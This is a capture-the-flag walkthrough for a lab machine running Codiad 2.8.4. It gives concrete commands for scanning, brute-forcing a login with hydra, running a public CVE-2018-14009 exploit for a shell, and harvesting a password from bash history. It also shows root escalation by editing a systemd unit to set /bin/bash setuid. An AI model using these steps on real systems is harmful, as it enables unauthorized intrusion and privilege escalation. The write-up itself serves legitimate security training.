# IDE

---

## *User flag* 

We'll start with a standard nmap scan:

> `sudo nmap 10.10.188.109 -Pn -p- -A -vv -T4 --script discovery,vuln -oN nmap-scan`

Using the following command we'll grab all running services:

> `cat nmap-scan | grep -e '[0-9]\+/tcp[[:space:]].*' -o`

The result would be like:

- 21/tcp    open  ftp     syn-ack ttl 63 vsftpd 3.0.3
- 22/tcp    open  ssh     syn-ack ttl 63 OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
- 80/tcp    open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))
- 62337/tcp open  http    syn-ack ttl 63 Apache httpd 2.4.29 ((Ubuntu))

Okey, we have ftp, ssh, http services running on Ubuntu. Nmap scripts, such as
http-sitemap-generator and http enum give us some of endpoints.

- For http on port 80:
    - /
    - /icons/
- For http on port 62337:
    - /
    - /data/
    - /js/
    - /lib/
    - /themes/
    - /components/user/
    - /themes/default/
    - /themes/default/editor/
    - /themes/default/fileext_textmode/
    - /themes/default/filemanager/
    - /themes/default/project/
    - /themes/default/settings/
    - /themes/default/user

Let's enumerate http services a bit in the background:

> `./ffuf -u http://$IP:80/FUZZ -of md -o ~/CTF/IDE/ffuf-port-80.md -t 50 -ic -w ~/CyberSecurity/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt`

(And the exact same command for port 62337)

And while ffuf is running, we should poke around in ftp service. anonymous login is 
allowed, so we can start with simple enumeration. Navigating to '...' directory reveals a 
note in the file '-':

> Hey john,
> 
> I have reset the password as you have asked. Please use the default password to login. 
> 
> Also, please take care of the image file ;)
> 
>\- drac.

Now we have 2 usernames:
- john
- drac

And a likely weak password for john. BTW, the ffuf is finished, so we have following
directory structure:

***The results for port 80:***

- server-status           [Status: 403, Size: 278, Words: 20, Lines: 10, Duration: 54ms]

Not impressive. ***Let's try port 62337:***

- themes                  [Status: 301, Size: 324, Words: 20, Lines: 10, Duration: 63ms]
- data                    [Status: 301, Size: 322, Words: 20, Lines: 10, Duration: 79ms]
- plugins                 [Status: 301, Size: 325, Words: 20, Lines: 10, Duration: 62ms]
- lib                     [Status: 301, Size: 321, Words: 20, Lines: 10, Duration: 58ms]
- languages               [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 54ms]
- js                      [Status: 301, Size: 320, Words: 20, Lines: 10, Duration: 89ms]
- components              [Status: 301, Size: 328, Words: 20, Lines: 10, Duration: 56ms]
- workspace               [Status: 301, Size: 327, Words: 20, Lines: 10, Duration: 56ms]
- server-status           [Status: 403, Size: 281, Words: 20, Lines: 10, Duration: 52ms]

Examining network connections in browser tab, we can conclude that backend is written in 
PHP.

Hmmm... Not particularly useful. Our next step would be bruteforsing ***john's*** account.
Use the following command to bruteforce a login form:

> `hydra -l john -P ~/CyberSecurity/SecLists/Passwords/Leaked-Databases/rockyou.txt 10.10.188.109 -s 62337 http-post-form '/components/user/controller.php?action=authenticate:username=^USER^&password=^PASS^&theme=default&language=en:F=Incorrect Username or Password' -V`

And BAM!: There's your password!.

Credentials won't work with ssh or ftp, so for now we're stuck with http service.
It seems like ssome kind of online-IDE, where john is developing video-streaming service:

![IDE-VIEW](https://i.postimg.cc/cCqBRQ7K/ide-view.png)

Awesome. We now have access to Codiad 2.8.4 instance. Maybe this version is vulnerable to 
comething?

A search on AttackerKB gave a buttload of results for our version! We'll pick 
CVE-2018-14009. An exploit already exists and can be found at [ExploitDB](https://www.exploit-db.com/exploits/49705)

Rename this gibberish to "exploit.py" and execute the following command:

> `python3 exploit.py`

Follow the instructions and you'll get an unprivileged shell!

First thing I did was navigating to /home, finding that we have only 1 user 'drac' and
listing drac's directory. We see that we have user.txt which belongs to drac. Lets try
and switch user to drack.

Let's see, what commands have drac typed in:

> `cat /home/drac/.bash_history`

It appears that he started mysql database, and we see a cleartext password!

To switch to 'drac', you'll need to upgrade your shell first:

> `python3 -c "import pty; pty.spawn('/bin/bash')"`

now

> `su drac`

with previously found password. Congratulations! You got the user flag!

---

## *Root flag* 

Let's enumerate machine a bit. To see, what drac can run with sudo, type:

> `sudo -l`

And you'll get the following output:

    Matching Defaults entries for drac on ide:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

    User drac may run the following commands on ide:
        (ALL : ALL) /usr/sbin/service vsftpd restart

Awesome. We can restart the service as root. Next thing we do, is to check whether we
can edit vsftpd.service file:

> `ls -la /lib/systemd/system/ | grep vsftpd`

and yes! It has 'drac' group!

We have to upgrade our shell more:

1. In YOUR terminal, run `echo $TERM`.
2. In NETCAT terminal, run:

> `CTRL+Z`
>
> `stty raw -echo`
>
> `fg + [Enter](x2)`

3. in the NETCAT terminal, run `export TERM=that-value-from-list-item-1`

Now you should be able to run `nano vsftpd.service`

Change it to be like this:

    [Unit]
    Description=vsftpd FTP server
    After=network.target

    [Service]
    Type=simple
    ExecStart=/bin/chmod u+s /bin/bash
    ExecReload=/bin/chmod u+s /bin/bash
    ExecStartPre=-/bin/chmod u+s /bin/bash

    [Install]
    WantedBy=multi-user.target

And then do:
> `systemctl daemon-reload`
>
> `sudo /usr/sbin/service vsftpd restart`
>
> `/bin/bash -p`

That's it! Go grab that root flag!